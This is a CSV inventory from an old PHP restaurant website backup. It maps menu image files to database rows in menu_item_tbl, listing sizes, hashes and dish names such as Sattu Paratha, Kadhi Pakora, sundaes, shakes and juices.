122.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_small_img
123.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/small/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_img
123.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/small/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_small_img
124.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_img
124.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_small_img
125.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_img
125.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_small_img
126.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_img
126.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_small_img
127.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_img
127.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_small_img
128.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_img
128.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_small_img
129.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_img
129.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_small_img
130.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_img
130.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_small_img
131.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_img
131.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_small_img
136.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_img
136.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_small_img
137.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_img
137.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_small_img
138.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_img
138.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_small_img
140.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_img
140.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_small_img
141.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_img
141.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_small_img
142.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/142.jpg,23366,7f88888b24a4f13d8ae83a5a0c7780c3697ef1bb3ea067dfe952639e103b6298,e1a08a5fd3c9c418103ff8afc0a7889a,DB Mapped (Verified),menu_item_tbl,142,Cocktail Sundae,menu_img
142.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/142.jpg,23366,7f88888b24a4f13d8ae83a5a0c7780c3697ef1bb3ea067dfe952639e103b6298,e1a08a5fd3c9c418103ff8afc0a7889a,DB Mapped (Verified),menu_item_tbl,142,Cocktail Sundae,menu_small_img
143.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/143.jpeg,11533,df56393535e8b4191a58a03d734cb4efa3ac9d21925098d06e4c76d094704444,cce2859ec6ebc971e3f16d5020569347,DB Mapped (Verified),menu_item_tbl,143,Himalayan Queen,menu_img
143.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/143.jpeg,11533,df56393535e8b4191a58a03d734cb4efa3ac9d21925098d06e4c76d094704444,cce2859ec6ebc971e3f16d5020569347,DB Mapped (Verified),menu_item_tbl,143,Himalayan Queen,menu_small_img
144.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/144.jpeg,10974,73f217d244a73bb88e7958939895b8398880db99ef3823190b7256d3f7a83de5,691fc6c515da19506f2eff1715d6ca73,DB Mapped (Verified),menu_item_tbl,144,Orange Crunch,menu_img
144.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/144.jpeg,10974,73f217d244a73bb88e7958939895b8398880db99ef3823190b7256d3f7a83de5,691fc6c515da19506f2eff1715d6ca73,DB Mapped (Verified),menu_item_tbl,144,Orange Crunch,menu_small_img
147.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/147.jpg,40941,547415841f861cf84ec65721627e26ab98d47f973f7086d4256091af80dbcdc9,45c281d08d39fb40bb9d9b1c9a04f9cd,DB Mapped (Verified),menu_item_tbl,147,Badshahi Gulab,menu_img
147.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/147.jpg,40941,547415841f861cf84ec65721627e26ab98d47f973f7086d4256091af80dbcdc9,45c281d08d39fb40bb9d9b1c9a04f9cd,DB Mapped (Verified),menu_item_tbl,147,Badshahi Gulab,menu_small_img
148.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/148.jpeg,6860,d8faea01fc1c173cbf719880dab13a2ebb0dbadc3ed1f4841b8a296a00528372,2bf5327e3981305dbc3e4f56343ef73c,DB Mapped (Verified),menu_item_tbl,148,Vanilla,menu_img
148.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/148.jpeg,6860,d8faea01fc1c173cbf719880dab13a2ebb0dbadc3ed1f4841b8a296a00528372,2bf5327e3981305dbc3e4f56343ef73c,DB Mapped (Verified),menu_item_tbl,148,Vanilla,menu_small_img
149.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/149.jpeg,8557,e5de28920e29d25df45c720f6587ee27d405a0c08785da8b3dd23bd8a7e3e0a4,0410f9e52f320f33b6bdbdb6055684ee,DB Mapped (Verified),menu_item_tbl,149,Pine Apple,menu_img
149.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/149.jpeg,8557,e5de28920e29d25df45c720f6587ee27d405a0c08785da8b3dd23bd8a7e3e0a4,0410f9e52f320f33b6bdbdb6055684ee,DB Mapped (Verified),menu_item_tbl,149,Pine Apple,menu_small_img
150.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/150.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,150,Kesar Badam,menu_img
150.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/150.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,150,Kesar Badam,menu_small_img
151.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/151.jpeg,10535,02301194d3c3d6f6583405751a0263845772ad637150aaba5f93982923ce8c6d,edf2cf651611e23e52c3b3091c967439,DB Mapped (Verified),menu_item_tbl,151,Kaju Anjeer,menu_img
151.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/151.jpeg,10535,02301194d3c3d6f6583405751a0263845772ad637150aaba5f93982923ce8c6d,edf2cf651611e23e52c3b3091c967439,DB Mapped (Verified),menu_item_tbl,151,Kaju Anjeer,menu_small_img
152.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/152.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,152,Strawberry,menu_img
152.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/152.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,152,Strawberry,menu_small_img
153.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/153.jpg,84853,96b8c1215b0693fbc2fefc6cb67bc63facea4037e268617af84cca476b29d4da,932b50de261ea98415234af7dd0a9d7e,DB Mapped (Verified),menu_item_tbl,153,Black Current,menu_img
153.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/153.jpg,84853,96b8c1215b0693fbc2fefc6cb67bc63facea4037e268617af84cca476b29d4da,932b50de261ea98415234af7dd0a9d7e,DB Mapped (Verified),menu_item_tbl,153,Black Current,menu_small_img
154.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/154.jpg,25820,a0260ca4ef8f1834d5451ecd24d582010f8815f2f4c9a57a561a19fa3cc21ad0,97bab0717936767039cd4be6ea8ee8ee,DB Mapped (Verified),menu_item_tbl,154,Khajoor Shake,menu_img
154.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/154.jpg,25820,a0260ca4ef8f1834d5451ecd24d582010f8815f2f4c9a57a561a19fa3cc21ad0,97bab0717936767039cd4be6ea8ee8ee,DB Mapped (Verified),menu_item_tbl,154,Khajoor Shake,menu_small_img
155.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/155.jpg,10457,8a01839ef38801602e5c3147e6d6a53ed4dff1622793490f900e4256c4bf1527,34aa3a5e6f2a4d20bf7700740439fe22,DB Mapped (Verified),menu_item_tbl,155,Cold Coffee,menu_img
155.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/155.jpg,10457,8a01839ef38801602e5c3147e6d6a53ed4dff1622793490f900e4256c4bf1527,34aa3a5e6f2a4d20bf7700740439fe22,DB Mapped (Verified),menu_item_tbl,155,Cold Coffee,menu_small_img
156.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/156.jpg,64446,f4024ba432f6c379daf8f5342999cb99e9a6677e66e2c14e61e1665a861c811d,6b1ee7229ee82d7f5bb79e3cb75dedbe,DB Mapped (Verified),menu_item_tbl,156,Badam Shake,menu_img
156.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/156.jpg,64446,f4024ba432f6c379daf8f5342999cb99e9a6677e66e2c14e61e1665a861c811d,6b1ee7229ee82d7f5bb79e3cb75dedbe,DB Mapped (Verified),menu_item_tbl,156,Badam Shake,menu_small_img
157.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/157.jpeg,9604,2d9679d16d4ddfbf05937a42c53c88f639cf28f92ed2c3b4e61550c15322ab81,fbfa079190fad1cb0db44390a20668cb,DB Mapped (Verified),menu_item_tbl,157,Kesaria Thandai,menu_img
157.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/157.jpeg,9604,2d9679d16d4ddfbf05937a42c53c88f639cf28f92ed2c3b4e61550c15322ab81,fbfa079190fad1cb0db44390a20668cb,DB Mapped (Verified),menu_item_tbl,157,Kesaria Thandai,menu_small_img
158.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/158.jpg,16170,00737a80de90a55288db3f8b8a8f544601928d21d6c233d43e89773558e1cc50,674944548f7ef767198ac330c647411a,DB Mapped (Verified),menu_item_tbl,158,Pista Shake,menu_img
158.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/158.jpg,16170,00737a80de90a55288db3f8b8a8f544601928d21d6c233d43e89773558e1cc50,674944548f7ef767198ac330c647411a,DB Mapped (Verified),menu_item_tbl,158,Pista Shake,menu_small_img
159.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/159.jpg,13142,70691390ad6d49a0470214e10a31f483a397de9e9966b9089db00b124ae7bf0b,1f170965b164e422a024829758d27763,DB Mapped (Verified),menu_item_tbl,159,Khus Shake,menu_img
159.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/159.jpg,13142,70691390ad6d49a0470214e10a31f483a397de9e9966b9089db00b124ae7bf0b,1f170965b164e422a024829758d27763,DB Mapped (Verified),menu_item_tbl,159,Khus Shake,menu_small_img
160.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/160.jpg,11209,ef6067e1822c933097f98c6d06f3684c153f75e287a1912e381e240059d3fb2a,9c791c7e94e1f154127e64c6222a3bf5,DB Mapped (Verified),menu_item_tbl,160,Mango Lassi,menu_img
160.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/160.jpg,11209,ef6067e1822c933097f98c6d06f3684c153f75e287a1912e381e240059d3fb2a,9c791c7e94e1f154127e64c6222a3bf5,DB Mapped (Verified),menu_item_tbl,160,Mango Lassi,menu_small_img
161.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/161.jpg,5285,527e30de88af2e13de1cd6737d93fb66a224495e11d03e620f766875a8889185,f7bcde7a2ee24c464f4b0e51970d8d16,DB Mapped (Verified),menu_item_tbl,161,Cheecoo Shake,menu_img
161.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/161.jpg,5285,527e30de88af2e13de1cd6737d93fb66a224495e11d03e620f766875a8889185,f7bcde7a2ee24c464f4b0e51970d8d16,DB Mapped (Verified),menu_item_tbl,161,Cheecoo Shake,menu_small_img
162.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/162.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,162,Mango Shake,menu_img
162.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/162.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,162,Mango Shake,menu_small_img
163.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/163.jpg,10685,b6c220ceebe439993aef857f4fc6bd92f4015c862a761004c412845aa5bf9fac,cb3d5b5ed0255c0d7c98703c6e9d0c63,DB Mapped (Verified),menu_item_tbl,163,Choco Shake,menu_img
163.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/163.jpg,10685,b6c220ceebe439993aef857f4fc6bd92f4015c862a761004c412845aa5bf9fac,cb3d5b5ed0255c0d7c98703c6e9d0c63,DB Mapped (Verified),menu_item_tbl,163,Choco Shake,menu_small_img
164.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/164.webp,29166,a5ab683e866f385c0c4c979b4e5104aa28a87fa1f996cab5d09af80fc2b025b5,343cc40c083fc3c6d6b240f3ef25ae06,DB Mapped (Verified),menu_item_tbl,164,Banana Shake,menu_img
164.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/164.webp,29166,a5ab683e866f385c0c4c979b4e5104aa28a87fa1f996cab5d09af80fc2b025b5,343cc40c083fc3c6d6b240f3ef25ae06,DB Mapped (Verified),menu_item_tbl,164,Banana Shake,menu_small_img
165.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/165.jpeg,5928,5c1b1ebbac9b1cdf55d3be22e0e6a3e631a4994b74453fae3dd77e7dd4df4bfd,6728b7d776f5d6c60cf39c387828af47,DB Mapped (Verified),menu_item_tbl,165,Fruit Shake,menu_img
165.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/165.jpeg,5928,5c1b1ebbac9b1cdf55d3be22e0e6a3e631a4994b74453fae3dd77e7dd4df4bfd,6728b7d776f5d6c60cf39c387828af47,DB Mapped (Verified),menu_item_tbl,165,Fruit Shake,menu_small_img
166.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/166.webp,55818,2b1cefef794be7245f441276f12ac062e230c6f270419e6624d02de5824615bd,4881bd299fc6e33d5ab033af573ba7c1,DB Mapped (Verified),menu_item_tbl,166,Thandai,menu_img
166.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/166.webp,55818,2b1cefef794be7245f441276f12ac062e230c6f270419e6624d02de5824615bd,4881bd299fc6e33d5ab033af573ba7c1,DB Mapped (Verified),menu_item_tbl,166,Thandai,menu_small_img
167.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/167.jpg,62666,0e4c9b09c6f5ec3844012f30043f06a81dc4ac51e6a08d7291187ef308c4e2d5,3b3f25ab54be2e33e2cbf36bf4354dd7,DB Mapped (Verified),menu_item_tbl,167,Khajoor,menu_img
167.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/167.jpg,62666,0e4c9b09c6f5ec3844012f30043f06a81dc4ac51e6a08d7291187ef308c4e2d5,3b3f25ab54be2e33e2cbf36bf4354dd7,DB Mapped (Verified),menu_item_tbl,167,Khajoor,menu_small_img
168.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/168.jpg,11237,efd482e3feeb2e111a60f77f5b13f6d39358db481c7ad66b1497f31805a1f7e9,5dbd83b5410e150a004098ae0aa29fab,DB Mapped (Verified),menu_item_tbl,168,Lassi,menu_img
168.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/168.jpg,11237,efd482e3feeb2e111a60f77f5b13f6d39358db481c7ad66b1497f31805a1f7e9,5dbd83b5410e150a004098ae0aa29fab,DB Mapped (Verified),menu_item_tbl,168,Lassi,menu_small_img
169.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/169.jpeg,8805,f290c7bfcaad3c1186c6abe55e5e205e7ea39dfe58c42d4f810aa05d64639f71,0ff37f25ca609a104c761c4068b6a6f4,DB Mapped (Verified),menu_item_tbl,169,Mix Fruits,menu_img
169.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/169.jpeg,8805,f290c7bfcaad3c1186c6abe55e5e205e7ea39dfe58c42d4f810aa05d64639f71,0ff37f25ca609a104c761c4068b6a6f4,DB Mapped (Verified),menu_item_tbl,169,Mix Fruits,menu_small_img
170.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/170.jpg,18463,78e27a9be89d69a86cd7edf7f60d32403b3b2cf26ff0d436fd3ef606e0a69c22,316eb7e3d8704b15bb1026e44c526f20,DB Mapped (Verified),menu_item_tbl,170,Fresh Juice,menu_img
170.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/170.jpg,18463,78e27a9be89d69a86cd7edf7f60d32403b3b2cf26ff0d436fd3ef606e0a69c22,316eb7e3d8704b15bb1026e44c526f20,DB Mapped (Verified),menu_item_tbl,170,Fresh Juice,menu_small_img
171.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/171.jpeg,3840,80c7172e95060546790ea5d31ce87838a93c953926fb326bf792e0371b655c08,28b8f190bd0a1488fde0697f7029bf2e,DB Mapped (Verified),menu_item_tbl,171,Coconut Water,menu_img
171.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/171.jpeg,3840,80c7172e95060546790ea5d31ce87838a93c953926fb326bf792e0371b655c08,28b8f190bd0a1488fde0697f7029bf2e,DB Mapped (Verified),menu_item_tbl,171,Coconut Water,menu_small_img
172.png,old-website-php/Full-website-backup/frontEnd/menuimg/small/172.png,85435,a151035bff8ca925d797fa2efea9613abe8097eed5b794e14e963c0f2607e373,bdc96ed01ebc4a812226bbef4a315578,DB Mapped (Verified),menu_item_tbl,172,Guava Juice,menu_img
172.png,old-website-php/Full-website-backup/frontEnd/menuimg/small/172.png,85435,a151035bff8ca925d797fa2efea9613abe8097eed5b794e14e963c0f2607e373,bdc96ed01ebc4a812226bbef4a315578,DB Mapped (Verified),menu_item_tbl,172,Guava Juice,menu_small_img
173.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/173.jpg,11462,63833af9faac7f633e8f7d3e411081c14754bb8324eb69f012ef173980246b73,8cea1fedf5283aba8e37c278adab3f07,DB Mapped (Verified),menu_item_tbl,173,Papita Juice,menu_img
173.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/173.jpg,11462,63833af9faac7f633e8f7d3e411081c14754bb8324eb69f012ef173980246b73,8cea1fedf5283aba8e37c278adab3f07,DB Mapped (Verified),menu_item_tbl,173,Papita Juice,menu_small_img
174.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/174.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,174,Mango Juice,menu_img
174.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/174.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,174,Mango Juice,menu_small_img
175.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/175.jpg,15666,570fea4cf18dc020d39f18a447c363e2cfbe93b3e1bbe86dbf4055de1dd5ef55,c9bc65073e2a142cb804a0a72ed69f7e,DB Mapped (Verified),menu_item_tbl,175,Plum Juice,menu_img
175.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/175.jpg,15666,570fea4cf18dc020d39f18a447c363e2cfbe93b3e1bbe86dbf4055de1dd5ef55,c9bc65073e2a142cb804a0a72ed69f7e,DB Mapped (Verified),menu_item_tbl,175,Plum Juice,menu_small_img
176.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/176.jpg,12005,a43b890fab3f401370245c33f4fc9a00e72fee4a58faea6c6c3ef1c7ad5cbb25,48cf8f92a3a7830ba345ad6618e19d2c,DB Mapped (Verified),menu_item_tbl,176,Water Melon Juice,menu_img
176.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/176.jpg,12005,a43b890fab3f401370245c33f4fc9a00e72fee4a58faea6c6c3ef1c7ad5cbb25,48cf8f92a3a7830ba345ad6618e19d2c,DB Mapped (Verified),menu_item_tbl,176,Water Melon Juice,menu_small_img
177.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/177.webp,43226,734867f9bbffea8d4f94723c98be4148af6afed1c5667faa888627ae9ea5a54a,a86ab29839cc7ff75c724d47a799481e,DB Mapped (Verified),menu_item_tbl,177,Falsa Juice,menu_img
177.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/177.webp,43226,734867f9bbffea8d4f94723c98be4148af6afed1c5667faa888627ae9ea5a54a,a86ab29839cc7ff75c724d47a799481e,DB Mapped (Verified),menu_item_tbl,177,Falsa Juice,menu_small_img
178.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/178.jpeg,4959,da68eb8a35b1d6ee8581c89e58fd42caa794b0e86d0094b3dd9a6de41bf4817e,5ec828ff595ea8a2d1a0440cf57f87cb,DB Mapped (Verified),menu_item_tbl,178,Kiwi Juice,menu_img
178.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/178.jpeg,4959,da68eb8a35b1d6ee8581c89e58fd42caa794b0e86d0094b3dd9a6de41bf4817e,5ec828ff595ea8a2d1a0440cf57f87cb,DB Mapped (Verified),menu_item_tbl,178,Kiwi Juice,menu_small_img
179.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/179.jpg,165712,97bf8a18199c46c7625ef6e8dfb30c9adbc99cc4fd3ea55eaf2e5299946b5e95,a10da67799f415aad9a31988cc7e46da,DB Mapped (Verified),menu_item_tbl,179,Tutti Frooti,menu_img
179.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/179.jpg,165712,97bf8a18199c46c7625ef6e8dfb30c9adbc99cc4fd3ea55eaf2e5299946b5e95,a10da67799f415aad9a31988cc7e46da,DB Mapped (Verified),menu_item_tbl,179,Tutti Frooti,menu_small_img
180.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/180.jpeg,4450,2cda43f8a6cdc6d6d2205bd4f173c2bdaa108b0bfc91b5d9965b2126780f9d72,adf0688d3450216b6b71f025ede6a92a,DB Mapped (Verified),menu_item_tbl,180,Ice Cream With Soda,menu_img
180.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/180.jpeg,4450,2cda43f8a6cdc6d6d2205bd4f173c2bdaa108b0bfc91b5d9965b2126780f9d72,adf0688d3450216b6b71f025ede6a92a,DB Mapped (Verified),menu_item_tbl,180,Ice Cream With Soda,menu_small_img
